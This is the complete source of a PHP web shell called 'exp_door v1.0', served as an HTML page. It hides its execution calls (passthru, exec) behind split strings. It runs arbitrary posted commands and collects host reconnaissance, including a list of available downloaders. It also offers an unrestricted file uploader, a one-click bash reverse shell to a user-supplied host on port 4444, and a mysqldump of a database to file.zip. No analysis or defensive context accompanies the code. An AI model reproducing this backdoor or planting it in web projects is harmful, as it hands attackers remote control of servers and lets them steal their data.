<!DOCTYPE html>
<html style="background-color: #D3D3D3;">
    <head>
        <title>exp_door</title>
<link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAOKAAADigGnjPUfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAg9JREFUeNrEV4GRgyAQjJkUQAl+BW8JlGAJfgeWQAmW4HdgCZRgCSmBDnhufsnfXBDBOB9nbhI54Ja95cDGe39553Mt6dQ0TUv2NgDhoeDdBrjuPwC4YHrDN70CoCnVQFgpgWhDfyfaaYKP0H4/AuAmJusF1RRsRlBLFvpoAeIL7YZ+q4EQA2CBghtmNBE51mAKKfARFNiIY8m3wE/jhujbs7zzNxD9GfFu8B6N8q9Y/xZMeTD3MgAVWWBtgwCxchDoE0FMLwEQk/GVdgicBAF/9LW5+a8JtQ/BxmAKTRa/mumGGKEg32j6FNtRiRqyL0Kx6iXSzsQ37zBE1qGNs6OrU4Ad4RFcscnGRF+uiVkI1Ul9lAKIkw6JFd35qhhDMSAXqDkkQraKUTDiBZBJpECaOgrAyvwhmK+w9XAdYJTrDWZKzRwVoecaED7NynSpxfKtahlIVTldwIRDyjT0MzPdqBIAs5jQJhS+mfvkSv92li0B0FYElDtDZcq6eRJ3pnO3k+s10dZvpGsUh5upOYy0MCVOywjEJcY9FSX0f6ThVnBhsRmfC4fWgsNoFe5RvGt2y6q+lJ7xxKtax07Yy6X06rSTor0UOATupVbOAKDYjhkSu+mhG6TpXnUjKgRh+Ep3akt/OgBRPR2KjoL1zDdU3wkrUzFlClSfGtec/XWMj1jN7oI2t5Wbd3+e/wgwAGD4W8SG5D6lAAAAAElFTkSuQmCC" rel="icon" type="image/png" />
<style>
hr {
border:1px !important;height: 1px;width:100% !important;background-color:#7d7171 !important;color:#7d7171 !important;
}
body {font-family: sans-serif !important;color:black !important;}
pre {margin: 0;}
</style>
    </head>
<body style="background-color: #D3D3D3;">

<img style="float:right" src="data:image/png;base64,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" />

<?php
$a1='pas'.'sth'.'ru';
$b2='ex'.'ec';
$id="id";
$pwd=__DIR__;
$uname=php_uname();
$php=phpversion();
$temp_file=sys_get_temp_dir();
$down="which get;which wget;which lynx;which curl;which fetch;which links;";


echo '<pre>';
echo 'id    | ';
echo $a1($id);
echo 'pwd   | '.$pwd.'<br>';
echo 'uname | '.$uname.'<br>';
echo 'tmp   | '.$temp_file.' '.substr(sprintf('%o', fileperms($temp_file)), -4).'<br>';
echo 'php   | '.$php.'<br>';
echo 'server| '.$_SERVER['SERVER_NAME'].' '.$_SERVER["SERVER_ADDR"].' '.$_SERVER['SERVER_SOFTWARE'];
echo '</pre>';
?>
<pre><p style="float:right;margin-block-end:3px;">exp_door v1.0</p></pre>
<hr>
<form style="display:inline" method="POST">
  cmd: <input type=text name=cmd>
</form>

<form style="display:inline" method="POST">
    <input type="submit" name="info" value="phpinfo"/>
    <input type="submit" name="ip" value="my ip"/>
    <input type="submit" name="down" value="downloaders"/>
</form>

<hr>

<div style="float: left;display:block;width:208px">
<pre>
<form method='POST'>
 <label><b>Base64 encode/decode:</b></label>
 <input style="width:178px" type=text name='base64'>
 <input type='submit' name='submit' value='Encode'><input type='submit' name='submit2' value='Decode'>
</form>
</pre>
</div>

<div style="float: left;display:block;width:208px">
<pre>
<form  method='POST'>
 <label><b>URL encode/decode:</b></label>
 <input style="width:178px" type='text' name='url'>
 <input type='submit' name='submit_u' value='Encode'><input type='submit' name='submit_u2' value='Decode'>  
</form>
</pre>
</div>

<div style="float: left;display:block;width:208px">
<pre>
<form  method='POST'>
 <label><b>BackConnect to 4444:</b></label>  
 <input style="width:178px" type="text" name="host_" placeholder="Enter host" required>
 <input type="submit" name="reverse" value="reverse">
</form>
</pre>
</div>

<div style="float: left;display:block">
<pre>
<form method="POST" enctype='multipart/form-data'>
 <label><b>Uploader:</b></label>
 <input type='file' name='filename' ><br/>
 <input type='submit' value='Upload'>
</form>
<pre>
</div>

<hr style="clear:both">
<form style="float:left;margin-right:20px;"method="POST">

    <p><input type="password" name="name" placeholder="DB name" required></p>
        <p><input type="password" name="user" placeholder="DB user" required></p>
        <p><input type="password" name="pass" placeholder="DB pass" required></p>  
        <p><input type="password" name="host" placeholder="MySQL host" required></p>
    <p><button type="submit" name="DB">Save DB to file.zip</button></p>  
</form>


<?php
if ($_FILES && $_FILES['filename']['error']== UPLOAD_ERR_OK)
{
    $name = $_FILES['filename']['name'];
    move_uploaded_file($_FILES['filename']['tmp_name'], $name);
    echo '<p style="color: red">'.'File Uploaded'.'</p>'; ;
}

    if(isset($_POST['info']))
    {echo phpinfo();}
    if(isset($_POST['ip']))
    {print $_SERVER['REMOTE_ADDR'];}
    if(isset($_POST['down']))
    {
echo '<pre>';
echo $a1($down);
echo '</pre>';
}

    if (isset($_POST['submit'])) {
    $base64 = $_POST['base64'];
    $encode = base64_encode($base64);
echo '<p style="color: red">'."Encode base64: ".'</p>'.$encode;
}
    if (isset($_POST['submit2'])) {
    $base64_d = $_POST['base64'];
    $decode = base64_decode($base64_d);
echo '<p style="color: red">'."Decode base64: ".'</p>'.htmlentities($decode);
}

if (isset($_POST['submit_u'])) {
  $url = $_POST['url'];
  $encode_u = urlencode($url);
  echo '<p style="color: red">'."Encode url: ".'</p>'.$encode_u;
}
if (isset($_POST['submit_u2'])) {
  $url_d = $_POST['url'];
  $decode_u = urldecode($url_d);
  echo '<p style="color: red">'."Decode url: ".'</p>'.htmlentities($decode_u);
}

if (isset($_POST['reverse'])) {  
   $back = $_POST['host_'];
   $a1("bash -c 'bash -i &> /dev/tcp/$back/4444 0>&1'");
 
}
?>

<pre>
<div style="float:left;margin-bottom:20px">
<?php
if(isset($_POST['cmd'])){
$a1($_POST['cmd']);
}
?>
</div>
</pre>

<?php

if(isset($_POST['DB'])){
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$name = $_POST['name'];
$link = new mysqli($host, $user, $pass, $name);

if ($link->connect_error) {
    die("<b>Database access is not available:</b><br>".$link->connect_error);
}else
    {$b2('mysqldump --user='.$user.' --password='.$pass.' --host='.$host.' '.$name.' > file.zip');echo 'Database access<br>';}
}
?>

</body>
</html>
